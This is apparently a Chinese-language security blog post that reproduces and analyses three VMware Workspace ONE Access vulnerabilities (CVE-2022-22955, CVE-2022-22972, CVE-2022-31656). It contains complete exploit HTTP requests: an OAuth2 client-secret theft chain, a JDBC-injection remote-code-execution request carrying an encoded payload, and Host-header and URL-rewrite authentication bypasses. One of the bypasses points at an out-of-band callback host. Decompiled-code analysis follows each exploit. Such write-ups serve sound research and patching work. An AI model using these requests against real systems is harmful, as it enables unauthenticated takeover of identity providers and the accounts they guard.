## VMWare Workspace ONE Access Auth Bypass

### 前言

[BlackHat议题: I Am Whoever I Say I Am: Infiltrating Identity Providers Using a 0Click Exploit](https://www.blackhat.com/us-22/briefings/schedule/index.html#i-am-whoever-i-say-i-am-infiltrating-identity-providers-using-a-click-exploit-26946)

> Single Sign On (SSO) has become the dominant authentication scheme to login to several related, yet independent, software systems. At the core of this are the identity providers (IdP). Their role is to perform credential verification and to supply a signed token that service providers (SP) can consume for access control.
>
> On the other hand, when an application requests resources on behalf of a user and they're granted, then an authorization request is made to an authorization server (AS). The AS exchanges a code for a token which is presented to a resource server (RS) and the requested resources are consumed by the requesting application.
>
> Whilst OAuth2 handles authorization, and SAML handles authentication and as such Identity and Access Management (IAM) solutions have become very popular in the enterprise environment to handle both use cases. What if IAM solutions are vulnerable to critical remote attacks? They need to be exposed on the internet, trusted to guard identities and facilitate access to hundreds if not thousands of users and applications.
>
> To begin with, I will cover the foundational use-case for IAM solutions and some past in the wild attacks (ITW) attacks with the extent of their impact.
>
> Continuing, I will present the approach I took with the audit including the challenges and pitfalls that I was faced with and how I overcame them. The result concluding with an unauthenticated remote code execution as root by chaining multiple vulnerabilities on a very popular IAM solution used by several Fortune 500 companies and government organizations.
>
> The vulnerabilities will be discussed in detail including novel exploitation strategies for bypassing strict outbound network access. Finally, a live demo will be presented with a release of functional exploit code so that penetration testers and network administrators can validate and remediate these critical findings.

说人话！（大致意思）

单点登录（SSO）是目前的主流认证方案，其大致原理是身份提供者（IdP）。他们的作用是执行凭证验证，并提供一个签名的令牌，服务提供者（SP）可以使用该令牌进行访问控制。然后引出了作者对OAuth2的认证研究，在表达了一下他研究成果的危害性，重要性。

---

### What Is IAM？

借用作者的PPT里原图，IAM是指 **Identity 认证**  和  **Access 授权** 管理。这里就简单提一下IAM的概念，具体可以看作者PPT内容。

![image-20220907153138806](https://img.sumsec.me/202209/202209071531935.png)



---

### 	From OAuth2 Bypass To RCE  CVE-2022-22955

#### 漏洞复现

```http
POST /SAAS/API/1.0/REST/oauth2/generateActivationToken/acs HTTP/1.1
User-Agent: Java/11
Host: 192.168.24.128
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 0


```

![image-20220830150826085](https://img.sumsec.me/202207/202208301508407.png)



第二步将第一步response中的token复制作为第二步的body，获取密钥值

（测试环境值为**crIWLiwGBwG5UqfH8OeSLPqJdXyKTLGA**）

```http
POST /SAAS/API/1.0/REST/oauth2/activate HTTP/1.1
User-Agent: Java/11
Host: 192.168.24.128
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-type: application/x-www-form-urlencoded
Content-Length: 168

eyJvdGEiOiI0OWQ1ZGQzZS04NTRlLTNhZTUtYjliNC1jNmY1YjU0NTI5YjA6cDdaZG5Ea0xpMTN6TkMzb25UMDVhTDdaYWFFSk95elUiLCJ1cmwiOiJodHRwczovLzE5Mi4xNjguMjQuMTI4LyIsInRpZCI6IlRFU1QifQ==
```

![image-20220830151149523](https://img.sumsec.me/202209/202208301511628.png)



第三步将第二步的获取到密钥作为第三步参数值，获取access_token

```http
POST /SAAS/auth/oauthtoken HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Java/11
Host: 192.168.24.128
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 90

grant_type=client_credentials&client_id=acs&client_secret=crIWLiwGBwG5UqfH8OeSLPqJdXyKTLGA
```

![image-20220830151428326](https://img.sumsec.me/202209/202208301514360.png)

如果将access_token进行jwt解密

```json
{
  "jti": "21d43615-df87-43f6-9c29-c08dc1ebe674",
  "prn": "acs@TEST",
  "domain": "System Domain",
  "user_id": "4",
  "auth_time": 1661842757,
  "iss": "https://192.168.24.128/SAAS/auth",
  "aud": "https://192.168.24.128/SAAS/auth/oauthtoken",
  "ctx": "[{\"mtd\":\"urn:vmware:names:ac:classes:LocalPasswordAuth\",\"iat\":1661842757,\"id\":3,\"typ\":\"00000000-0000-0000-0000-000000000014\",\"idm\":true}]",
  "scp": "system admin",
  "idp": "0",
  "eml": "OAuthClient_acs@noreply.com",
  "cid": "acs",
  "did": "",
  "wid": "",
  "rules": {
    "expiry": 1662447557,
    "rules": [
      {
        "name": null,
        "disabled": false,
        "description": null,
        "resources": [
          "*"
        ],
        "actions": [
          "*"
        ],
        "conditions": null,
        "advice": null
      }
    ],
    "link": null
  },
  "pid": "21d43615-df87-43f6-9c29-c08dc1ebe674",
  "exp": 1662447557,
  "iat": 1661842757,
  "sub": "386f1db6-4f4b-4cf8-bb6c-ba2f7dd85907",
  "prn_type": "SERVICE"
}
```



---

第四步将获取到access_token作为cookie，构造恶意请求并发送

```http
POST /SAAS/API/1.0/REST/system/dbCheck HTTP/1.1
Cookie: HZN=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJqdGkiOiIyMWQ0MzYxNS1kZjg3LTQzZjYtOWMyOS1jMDhkYzFlYmU2NzQiLCJwcm4iOiJhY3NAVEVTVCIsImRvbWFpbiI6IlN5c3RlbSBEb21haW4iLCJ1c2VyX2lkIjoiNCIsImF1dGhfdGltZSI6MTY2MTg0Mjc1NywiaXNzIjoiaHR0cHM6Ly8xOTIuMTY4LjI0LjEyOC9TQUFTL2F1dGgiLCJhdWQiOiJodHRwczovLzE5Mi4xNjguMjQuMTI4L1NBQVMvYXV0aC9vYXV0aHRva2VuIiwiY3R4IjoiW3tcIm10ZFwiOlwidXJuOnZtd2FyZTpuYW1lczphYzpjbGFzc2VzOkxvY2FsUGFzc3dvcmRBdXRoXCIsXCJpYXRcIjoxNjYxODQyNzU3LFwiaWRcIjozLFwidHlwXCI6XCIwMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMTRcIixcImlkbVwiOnRydWV9XSIsInNjcCI6InN5c3RlbSBhZG1pbiIsImlkcCI6IjAiLCJlbWwiOiJPQXV0aENsaWVudF9hY3NAbm9yZXBseS5jb20iLCJjaWQiOiJhY3MiLCJkaWQiOiIiLCJ3aWQiOiIiLCJydWxlcyI6eyJleHBpcnkiOjE2NjI0NDc1NTcsInJ1bGVzIjpbeyJuYW1lIjpudWxsLCJkaXNhYmxlZCI6ZmFsc2UsImRlc2NyaXB0aW9uIjpudWxsLCJyZXNvdXJjZXMiOlsiKiJdLCJhY3Rpb25zIjpbIioiXSwiY29uZGl0aW9ucyI6bnVsbCwiYWR2aWNlIjpudWxsfV0sImxpbmsiOm51bGx9LCJwaWQiOiIyMWQ0MzYxNS1kZjg3LTQzZjYtOWMyOS1jMDhkYzFlYmU2NzQiLCJleHAiOjE2NjI0NDc1NTcsImlhdCI6MTY2MTg0Mjc1Nywic3ViIjoiMzg2ZjFkYjYtNGY0Yi00Y2Y4LWJiNmMtYmEyZjdkZDg1OTA3IiwicHJuX3R5cGUiOiJTRVJWSUNFIn0.NEgQIpYnGZRjUG1OrwOs1sMVdBdumzJf0yIqmtzxwJnbfJlNDSASu8VgyElIc9byhkRV8h0IUsY_jnz_VZr0pnBWEg_do-TbBwTWHsDLPQPpkEKSXicoX56m2Iu0neV5IixBdNUfbImHmSCHqI8j08R2nvAUtjiRQQRp5iPFr3BugNQslIYv5wLMoegZOuFCdmfm-VrzusCZY9AG41R1xOMII5drJ73hBAk9_KxmCN9Znq2NCdXn2E8MK6pJ05DcR73eOIA14vAhN6OKwW5QjRn-3H3yQc2M_rFfic8L3-o9-8QzEe4CwLPbmN5xxL1zF3fjpFguriG39JZS09MahQ
Content-Type: application/x-www-form-urlencoded
User-Agent: Java/11
Host: 192.168.24.128
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 4576

jdbcUrl=jdbc:postgresql://fCYhc9Bp/saas?socketFactory=com.vmware.licensecheck.LicenseChecker%26socketFactoryArg=yv7a3gAAC7QAAAAIqOpr4c1H0VAAAAAQE1RdixhGW49W7zJBEMllPgAAC5DZOFpIGuqCqGmI9bHabUd%252B%252BOj0jZScmr8PfQEgLXMIJQT9Ih6qG8I9IPn0D%252F7Wx5JgPhMUXsqM20%252BVSp%252BmHXWq4GGAhcDAoEbqCEt7PzQN21wm0F2SbVYzF8qlChAg1HHX7i6DGvVKX1Z5OWOxKQf3qn4L%252BXf4McHAOii62v0zLn61TLtrV41sy5vkhpe92Y%252F1HYFUHpD3pZ4Uozot1xOdhCtnd%252BT74%252FkYg%252FEHLT4g%252BwOuKwi9RW5mc8bomRqfyXlZMpYqmgGXfqOQPnTrqyn6ch9pGgngfmXQA1Qf2FgTa2N9Tmdo5S8biygxBCZX3jP26TltWmMYcWxJ87B0YDrU4SgspPn2VgfZteyoxAykR6DpSwoOUPdAFw5Pb%252FjHqC9DRNLvzv6mWOqn%252FZgjvJYu3WT8BOyu%252Bdc8Eofaq7nPg33QvG0%252FZ7Lc1QlVkKWGr%252BHfUNwr%252F1Se%252FusYB2UYZ9zQm7NVb7uf7QsxF7W85QtjMUQEN6tOHWpSGUrxwSYu9IQWQoXVtqaNIvNe42UrPfNIw3X5L3nZVcDkSt1OD7fneDCX4bVLNqYSntUyQ6K%252F%252FwGJvO8NBciHwfcicRfRkRAsbOKJITN7aeNjrdCEAmYUlA9Vjfn2vnJCp4mW5CFJZlFAJOY92yPX1v8NkAxq9EErlSSA6HRG3u9LQzxWjzQ9KOZBotFRFyr0RECPOf3eUdvlt1zlRZ8QfFj0iwM1U%252Bre72ckkhOxMvjP1vNChCuGmLQP%252FalC3MrKR3mr9aiZ%252BogpCRT2M%252BXtIeqkQKUw9V25Tz6M88ODNHkjLzoPD6T9lBhvxCe1aLTh%252B4DYu4gHyy5xwQlwa79QDIg%252BZqGMjwOBgQP2BHNOC9RNR84TtvuGB3wG2COxY5FUNv%252FIB79lu31cPVALDxE5V9O%252BG7HXGS%252BAIk0C8DVx7J8lsXvz4nX%252BSf3hCRnCVAxbSYRmeiuY4EuwDM7%252F2fXj3bqP97WWs4HvAg1v2%252FEuoGuCrmFw5vRTls7uRr2OumbPxjEJTg6%252Bo5MSiNnBwGGA%252F%252FQUtcxNURXXHO4UApIW6enY617YuTbdhRO0U4jk2Q0jxUYrGcIWDNuEX%252Bx7bXkeuanQbeJa7nbat%252Fv8BOnUZcjYXBRspxH23UGxlWldEv5%252FOyWNfN3PcfpiUuV1%252BsS9NEViEEXe8vmsSzbt619hb4snC%252BxbzGb6t8ZB4pNVrDDdo6OvqAyY1HSLErnR%252F6jiJCvFlzbxCa3HDPcA4mWl5ttyONRENzZoVB%252BB21GxWQ%252Fkk3GyAhRqeylpY7MsjTd5WPN1axL8b5Bu9Yhj81bI1ucik1A%252F2peNYXVI9bNcYV4OHMCOrpuYVS%252BxqtEdndh92Kk7LA8DMt%252B6CBQYZF9g4PHJjoQbGMycVsoe9069K7TnuVX4fF8DKToWenQVGujcYKIylOo7esv3MDEDbR85TTvYhbQpj3%252BA4pbf8C%252BaEQFirvRq5DGrIxswdg1i%252B4uCcO9dbWQaPjPuXyXG9W7OfYngesuQQ8tqeIMz3M4HNWMy6E5fMgv4Z%252FD%252F2%252FtI7p%252Bmq4bB%252BBXiNsp2Y%252FT1y06vZCcdF5Uxt197MDCC0WvlXHAInPztnW3hUd4VgKPZN19GK9JIQUGDLgom7MCDhEO7EJArJNa1DFNKP%252B9P7ryEren6RIQs400Ozcu9kjdy0pfGYm8I2oMPl9AydThSTQg8kfFfELIcuC6uKGKe9qjfZgxJlmU5LLDzsob7XooaFN1hbO7y7ioHH%252Fip8a2YNpxpqzENGR10aw1VE5JvxqI3iaQJSaHFBzE2fpJePCwxoDCHmYKzi79x8lu%252BYlAZ1Z2WHWU7MWkkxpanSZGRYa7ulc%252B4dr5ASZbtyNa%252BNjZPlnlgJF4vKWpQKhubcny63grhXwHrhdfZSTbQiJeF01ee2wMHcRKfNWzud7Yc34DWAm4ar8JLX3%252BDAKWjP0wI4lHgoc6HE7piO9NPMQyAQwE9tfOf414kYyatHviyJNa4jj0Ne6i%252BMFp0YQBxMSgu9kGxtNzQ8Bwdl1LvWEPXD2EfrQFvI8iki40Wm67uAjWnZ4RIoDgt3VcBkYw%252FMlwI5wZK5Yg5mf8LU17%252B06tmP2WZpNK6MeFFcuy5SqfLFX%252Bp%252BZswjwI7M8ZI1Qc9yhuyWoLSOdyYzjCZXOCEmsj46%252BFrDDaBAXj8o6kl94wzy2Q%252B4tPUudNSIVkMR%252B%252B6SzXR%252Bdrnn5yVjdIYET1JUAKMnL1mcKc1gF4ew4dI9JLYW25eZDqC111IaAfRUKKLuepE7LoNqioenxrqIVTRHs4dXgJt8XaezyngyIwHtyCxKgycvU%252B1Z3IAm12lK24aYcRAqF4cV89YHzeSHHLRv9ULffFOV65Q6C4WzqVpJnoJn%252B49DtzPnoICQ2ks9hVM%252F1jEDjfA4KZKpNwY4FcuhzM4CwTbjw1oirdIrqeNU9a0n2RoRM6OsQ9a%252FGJsgji6kaUvXEeOe3gSPLwAywU7GmDxjqyMBd1djZNhn8mn3fxiNM9xPqxQe%252Fx026%252BkQ6xIg5GIl8p22BQ7mW1kTQoU7sHJ44RXB0GNtZ1tGGOpPeqI7IYyS5ic%252B8NEnUSqZdIAjKTz5Q5NuXmCzeAVEVgtzlUBzUn45z6IGSV%252F99uy9IGlzNqWLJvPxIZ5k%252FXA6ilqrVSlZX6iOpbGeQEBhZNFKSfh5GKGDsLHIiCzOscIFcFvBhaBc9THQapOMkiCmjd0qiAMrM%252BtM8EkwGZVNtlAMV9YEe48NaLXfT2QTG15aECZyJEWK7QwwM%252BWuojX%252FHMzyKM4%252FQab8ByyyW7VIi81y6Q2G4MTp0SqW9PbDYHMl1gPpdc8eOC3DVHdfoeiOygD%252FcDLd0Oxyf4J9KnN5B02mrbMQAb8j2B8AlglqsFL6iqnrHTyFRay1qKSPKRNLAMWrS25jRFtTpJXKRH4V9ovkNqh8A404KqG3w4T1loTLzHOcwCvU9p6kIDxFDnmGxwhmE2G3X3h2fDo%252B5kU7Vvs9qgwn6Cfpdr0VZBY7lYtQATefnPTi1kTyOz3ClifqpBBfFhXtBDNxZv34z%252BDckpNL8YbiAXP%252Frslkx6UunUJQvfEkJ96m4fCZFIKnERdAW70oU%252FKlqX4UD3dGUHO%252BpvaE7edFlLco1irRJWQfnvgJXYxaWtGXm9DwuDflf2ipTZb2nEbGs6Y3FkKi57Ar6O11CxarFg8It1pj9I6uRvu889MPTZjWeejGnusQBVTqYhspXLRAqed1EF%252BV6QEJ1MQNjhl3uyVFVu0ui1aXUTnZ7LC0uS1V2al2BZvzAfWDUDirJYXe3NomnXsLKj0l0fGsltU2XIgZlj4zDdGywc3YSZsudnid8v6JFdkgfRoG92qAZx99jAlufZEFFVj9sxzRrSd3RpvYu3sHOiqQD0iQxqIFg%252FvtYEcqKGBk%252FpPdO65M8qEXJDuRVva4NVHBOt5x60pFDsyWp2p4nFtrjfMFjluSxq8iOwnCsiCHzxxN2RwwNIzgUFLJDg%252BtrLcHNptYbCq2p8kRTo7%252BtZ97LBUm9WVpXuXQR31AGkiptzJGhYXZMvXaWeHQa8hVuAvHyBc9X5%252B9xOab%252BVq2U6zy3YJji6ieOj4PC1JKKiX0VbUmJOpVBA9lH77etM1KJOS%252F1wUpDorG%252BWZc2evUtTP4eiOAhUP3UI1a1iXeiRD8qX9tCYsyP8AYS0QVwPHizT2p5sJ8xsbMwb5iBE42WvupGo1RK1M1NBFxdFbmgW76iTKalo8n1Q9HrfJprAH49zTYgNAtFMRwmEWJdJ%252BBGmzVFLwL5J%252FngN2JwP1c%252BVgWrJuZ6Mllqu774%252BdDEpRXiXb%252BwmI%252B6Gou4kDNdTbLjEeGd1li0akHxl7oqt4SAMC0wzoR7CqwXzbCFLZ54yWTOLl5GXcaO2FEdVqTGMz3iP1WFtQWzh6P90cYroK3KLnscsKKg72%252Fj8y0YtG5RHKbF3kQqVrFA%253D%253D&dbUsername=&dbPassword=
```

![image-20220830151615968](https://img.sumsec.me/202209/202208301516002.png)



---

#### 漏洞分析

**/SAAS/API/1.0/REST/oauth2/generateActivationToken/acs**接口对应漏洞代码/SAAS/WEB-INF/classes/com/vmware/horizon/rest/controller/oauth2/OAuth2TokenResourceController.class

![image-20220906171756616](https://img.sumsec.me/202209/202209061717691.png)

VMWare Workspace ONE Access 默认安装之后，会默认存在id为acs的Client。

![image-20220906171556742](https://img.sumsec.me/202209/202209061715846.png)

**/SAAS/API/1.0/REST/oauth2/activate** 会根据传入的activationCode返回密钥

![image-20220906172705858](https://img.sumsec.me/202209/202209061727041.png)





---

### Authentication Bypass To RCE CVE-2022-22972	

#### 漏洞复现

修改Host的值，如果为域名不存在则会返回登录页面

```http
POST /SAAS/auth/login/embeddedauthbroker/callback HTTP/1.1
Host: asdasd:1090
Cookie: LOGIN_XSRF=CFtnkwKqzk6xgmu; JSESSIONID=06AA1F963FB620BA69EA3D5A40F501DD
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://192.168.24.128/SAAS/auth/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 1470
Origin: https://192.168.24.128
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

protected_state=eyJzaWciOiJ7XCJzaWduYXR1cmVCNjRcIjpcIkRaY1JhQ0o4MHJMcjcrNW5teTFZVG1CaDM3bk1SSXdFa1NHWGxhY0JRTVNPOWNwMjJuOURiUjQ3OVZEbVlZQlhBS253MldjUmNEUlBrWFcwWmVHUkt0QnVNMkJzeGlqOU1tVkJTRzhkNXFNR09ZVm5lN1RWRVpDSXFGc3RQczBEdHovOFpWOGpoYU9WZkxEd241cWxOVExFOHZDeUhrQzlmcUJpbzNPYmxpbGI1Q1k1blFxMSthV3JDQlRvVFlZbWZUYTRXQlIycjI5OTN6UjRYNG84SmZlUFRGc3Q2bUZGZXNEa0cwaW5xekxvSElMVzFMbzdxME1KOXJjUWtFNndqWlBYZjFlRjRmQi8wZFJSZTdLQkQ3RW9jTk05djJpOFlEbGNSV0IyZm10cnppeEloM3IrWnltc3o0M3U4ZFhVYWFRUUx2S2pTS2VEam93NVdpMWZxRWM2MHFkTGc1anh2alBadDNHVDRzZkhxWDNTSkh1Qm54aCtTS2wzMHBVV0F4QWV0dWFqcFNNWGs1UzZuQTUxTUhYNitwbTNxb3pqb20zYnU2bHdZQnhMSGk1UWtnSnRPeEx0Q0JVcjlzREpBRlZGYmNZQXhRM0JoQ1BWNmF5NUtBdnl2Zmt6eFA1MEtaM1c2RXdScWNNeFZJYnBmRkwrOGlPaEh3TzZhaC8xb1FIT09DdE8rdmhoNmlVclVGQ29LcCtsdnZUMmxWTXV4WTF1TEgrb3kvcU1nRCtRSkh5dWpBOCs0TDBpbWlBZXc5UVJzUDdFT3Y3YU9xeS9oU2NhT1BiUVhyRmt2YWJWUkJOaUw2YUpKYk5rRFlCSHg0S0o4OU9XWGE4MElpT1JaeFFyWTgvNm5PZVh0Q2xFRHNZN2ZreitiN2dCeVNjQnZhY2xsNzdZRWh3PVwiLFwiYWxnb3JpdGhtXCI6XCJTSEEyNTZ3aXRoUlNBXCIsXCJrZXlSZWZcIjpcImRiMjA5OWJmLWFmNDYtNGU0MC05YjAzLThhMDc0ZTZiNjcyMVwiLFwiZGF0YUI2NFwiOm51bGx9IiwidmFsIjoie1wiYXV0aG5Db250ZXh0XCI6XCJcIixcImRvbWFpblwiOlwiU3lzdGVtIERvbWFpblwiLFwidXNlck5hbWVUZXh0RmllbGRSZWFkb25seVwiOlwiZmFsc2VcIixcIm51bUF0dGVtcHRlZFwiOlwiMFwifSJ9&userstore=System+Domain&username=admin&password=asd&userstoreDisplay=System+Domain&horizonRelayState=e798ec60-1a93-4779-ad37-d8156260d3d2&stickyConnectorId=&action=signIn&LOGIN_XSRF=CFtnkwKqzk6xgmu
```

![image-20220830172655870](https://img.sumsec.me/202209/202208301726115.png)

如果host的域名旗下路径/SAAS/API/1.0/REST/auth/local/login能够被正常解析，则会返回token进而绕过登录认证。这里使用正常的dnslog平台不行，可以使用burp自带的dnslog或者构造一个页面，状态码返回200即可。

![image-20220830184826015](https://img.sumsec.me/202209/202208301848128.png)

---

#### 漏洞分析

修改host值，然后找日志信息错误的堆栈，找到对应的实现代码。

```bash
grep -irn "asdasd" -A 200 -B 10
```

![image-20220906174414211](https://img.sumsec.me/202209/202209061744336.png)

**/SAAS/auth/login/embeddedauthbroker/callback**接口对应代码**/embeddedauthadapters/local-password-auth-adapter-0.1.jar!/com/vmware/horizon/adapters/local/LocalPasswordAuthAdapter.class**

![image-20220906174702552](https://img.sumsec.me/202209/202209061747647.png)

**getLocalUrl方法**中调用**request.getServerName(), request.getServerPort()**获取主机和端口，两个方法是从Host获取主机和端口。如果主机为域名则为域名，IP则为IP。

```java
private String getLocalUrl(HttpServletRequest request) {
    if (null == request) {
        return null;
    } else {
        try {
            return (new URL(SSLConst.HTTPS, request.getServerName(), request.getServerPort(), request.getContextPath() + "/API/1.0/REST/auth/local/login")).toString();
        } catch (MalformedURLException var3) {
            log.error("Failed to create URL: " + var3.getMessage(), var3);
            return null;
        }
    }
}
```


最终获取到url值为**https://{host}:{port}/SAAS/API/1.0/REST/auth/local/login**，然后会调用**authenticate方法**进行认证。![image-20220906175139592](https://img.sumsec.me/202209/202209061751629.png)

**/embeddedauthadapters/local-password-auth-adapter-0.1.jar!/com/vmware/horizon/adapters/local/LocalPasswordService.class** 的authenticate方法会请求传入的URL，如果**返回状态码为200就返回true**，认证成功。

![image-20220906175324938](https://img.sumsec.me/202209/202209061753030.png)

---

###  UrlRewriteFilter Bypass To RCE CVE-2022-31656

#### 漏洞复现

```http
POST /SAAS/t/_/;/auth/login/embeddedauthbroker/callback HTTP/1.1
Host: 7z7plqibnrvcxadz7wpfrqeq3h97xw.oastify.com
Cookie: LOGIN_XSRF=aJJ4le9kzKf9ZM9; JSESSIONID=A4DBC3EBD4467C9BC7E3F65C0403674B
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 1472
Origin: https://www.test.com
Referer: https://www.test.com/SAAS/auth/login/embeddedauthbroker/callback
Connection: close

protected_state=eyJzaWciOiJ7XCJzaWduYXR1cmVCNjRcIjpcIloxRHhvMU9vd0RQakFNdy9hQ1c0M0ZmSmNpdXNUQnFUMEppV1J1V0E0RkVVdEJObEJmem91eDdRUzJ3bGJPeXhXSW5yRmZVT2FLYWgwb3VGNkxPN0xiMStFTTFUWGUzZW5BamlkdnN1UDVQZmRFdkxhdWwreEk1TFFybWVISG5ISEk0OXk3Q1prTEtGSis0c3N3SWlzTFg5bkMxWjJLcW9rck9CSzNPYmJ2U09Oeko3NFJva3creWJNSk5ma3M3R21zeE5KVDNydFZLVmVRV0o1U2RUTStNKzJ1bWlRd1JyREtWdGxDc0dLZ2xKa3ZFVldJZXRYN0tYLzVVOEZXa2c1UTYrN0xsQjhMcXBRdklaK05KOHlJRTZRMDY4ejJSR2NUZG9JUU1Zc01oV2lNSVV0dHdKUWY2MGduUHliaHQ0Zm13Z2wxVlJPMGwySHNWRW0vMTYzbmNtd3Bjd2s4b0VpQ21yME9tekFrL0JxWU5lTlBqTUdxRU54T3pBdUdISGlhZVlvbTRCR25JRjkwRko5MVMyR3dWNkM0L3NKWmRUc3g2YlpJN2hIeVZIM0FpVXdObzlwSmwxcllZOUZxUTNINzlBN0t2SzM5RDdoRldDR3duVmphaHFXL1VSSmNMSUFBMCtNZzJ6NmMxdUNwbUx4SEtRT3NuQTkzSEt4dlRpNkY1eGJRb1hrcWFLQnZuNEkxZHdKS1JpQ1RNbDRSckJlZ3V0bTI1NGJoNFZMZ0VQU01KYUlWc1YyL1VFU0RRWWMzbEwvaFFJWHpTRllQY2RSVDd0Z2JOSUM0Q3JDb0VWRmRuZEZMUjBKSnFGU28yTUJ4ZTBZNEwxYi9zc0ttZzMra3VQMFRHY2tWZFNsU2xzYXFnckRxTWFmVkhtR0RTMlJWb0RoNG5zY3NZPVwiLFwiYWxnb3JpdGhtXCI6XCJTSEEyNTZ3aXRoUlNBXCIsXCJrZXlSZWZcIjpcImRiMjA5OWJmLWFmNDYtNGU0MC05YjAzLThhMDc0ZTZiNjcyMVwiLFwiZGF0YUI2NFwiOm51bGx9IiwidmFsIjoie1wiYXV0aG5Db250ZXh0XCI6XCJcIixcImRvbWFpblwiOlwiU3lzdGVtIERvbWFpblwiLFwidXNlck5hbWVUZXh0RmllbGRSZWFkb25seVwiOlwiZmFsc2VcIixcIm51bUF0dGVtcHRlZFwiOlwiMlwifSJ9&userstore=System+Domain&username=admin&password=admin&userstoreDisplay=System+Domain&horizonRelayState=d7c0110d-cd93-4cd5-809b-f20f0befb36e&stickyConnectorId=&action=signIn&LOGIN_XSRF=aJJ4le9kzKf9ZM9
```

![image-20220906145351505](https://img.sumsec.me/202209/202209061453785.png)

---

#### 漏洞分析

首先会经过**UrlRewriteFilter** /SAAS/WEB-INF/lib/urlrewritefilter-4.0.4.jar!/org/tuckey/web/filters/urlrewrite/UrlRewriteFilter.class

![image-20220906145736837](https://img.sumsec.me/202209/202209061457923.png)

在跳转到/ROOT/WEB-INF/lib/urlrewritefilter-4.0.4.jar!/org/tuckey/web/filters/urlrewrite/NormalRule.class的Path **/t/_/;/auth/login/embeddedauthbroker/callback**这里经过正则匹配之后就变成了**/;/auth/login/embeddedauthbroker/callback**。

![image-20220906151403872](https://img.sumsec.me/202209/202209061514006.png)

代码匹配实现逻辑demo

```java
    public static void main( String[] args ) throws Exception {
        String regx = "^/t/([^/]*)($|/)(((?!META-INF|WEB-INF).*))$";
        String content =  "/t/_/;/auth/login/embeddedauthbroker/callback";
        Pattern pattern = Pattern.compile(regx);
        Matcher matcher = pattern.matcher(content);
        matcher.find();
        for (int i = 0; i < matcher.groupCount(); i++) {
            System.out.println("group id["+i+"]: " + matcher.group(i));
        }

    }
```

![image-20220906155950840](https://img.sumsec.me/202209/202209061559914.png)

下一步跳转到/ROOT/WEB-INF/lib/urlrewritefilter-4.0.4.jar!/org/tuckey/web/filters/urlrewrite/RuleExecutionOutput.class，将url进行替换。**并同时调用setRedirect方法，设置为true。**

![image-20220906151807338](https://img.sumsec.me/202209/202209061518384.png)

在最终返回到/SAAS/WEB-INF/lib/urlrewritefilter-4.0.4.jar!/org/tuckey/web/filters/urlrewrite/RuleChain.class此时**/t/_/;/auth/login/embeddedauthbroker/callback**彻底变成了**/;/auth/login/embeddedauthbroker/callback**。

![image-20220906152022147](https://img.sumsec.me/202209/202209061520211.png)

在调用handlerRewrite方法![image-20220906152126258](https://img.sumsec.me/202209/202209061521295.png)

handlerRewrite方法调用doRewrite方法到/SAAS/WEB-INF/lib/urlrewritefilter-4.0.4.jar!/org/tuckey/web/filters/urlrewrite/NormalRewrittenUrl.class

![image-20220906152213095](https://img.sumsec.me/202209/202209061522154.png)

这里isForward是前面掉用了etRedirect方法，设置为true。forward转发之后不再继续走filter，跳过了HostHeaderFilter过滤，并且经过getRequestDispatcher之后servletPath变为**/auth**，分号被去除，完美绕过。后续漏洞逻辑是Authentication Bypass RCE CVE-2022-22972。至于分号为什么会去除，这里是tomcat的**getRequestDispatcher**方法特性。

![image-20220906152522028](https://img.sumsec.me/202209/202209061525061.png)

![image-20220906153525645](https://img.sumsec.me/202209/202209061535714.png)

tomcat的**getRequestDispatcher**方法特性，会取第一个**/**后面的路径作为servletPath。

![image-20220906160409156](https://img.sumsec.me/202209/202209061604250.png)



---

### 回顾总结

本次一共分享了三个漏洞，分别是：

* From OAuth2 Bypass To RCE  CVE-2022-22955
* Authentication Bypass To RCE CVE-2022-22972
* UrlRewriteFilter Bypass To RCE CVE-2022-31656

CVE-2022-22955 漏洞是正常功能导致漏洞，而 CVE-2022-22972 和 CVE-2022-31656 是非预期导致漏洞。

CVE-2022-22972 是使用了 request 中的 getServerName 方法获取域名（主机）和 getServerPort 获取端口，关于更多 request 的方法可以参考 [Request中的各种方法](https://www.cnblogs.com/xrq730/p/4903161.html)。

CVE-2022-31656 是 CVE-2022-22972 漏洞的绕过，其主要是使用正则匹配规则不当导致权限绕过，之前也分享其他框架中正则匹配使用不当，参考链接 [正则匹配配置不当](https://sumsec.me/2022/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93.html)。

其中 CVE-2022-22955 是议题中重点内容，CVE-2022-22972 和 CVE-2022-31656 是个人补充的两个漏洞，个人感觉后者两个漏洞相比前者漏洞更有意思一点。

---

### 题外话

在作者的PPT内容里，其实有一半的内容是和IAM的相关性不是很强的。比例说原PPT内容中花了一段篇幅讲述 CVE-2022-22954 SSTI 服务端模版注入、CVE-2020-4006 命令注入漏洞以及 JDBC 注入漏洞利用，当然 JDBC 注入漏洞利用是为了更好表达如何 From OAuth2 Bypass To RCE  CVE-2022-22955 的主题。

其实也能理解作者，这么做为了引言，更好的表达自己发现的漏洞的危害性，厉害之处。这么来看整个PPT内容其实更倾向表达作者是如何发现CVE-2022-22955漏洞，如何一步步的扩大漏洞危害（有一种炫耀的感觉）。

---

### 参考

https://y4er.com/posts/cve-2022-31656-vmware-workspace-one-access-urlrewritefilter-auth-bypass/#rce

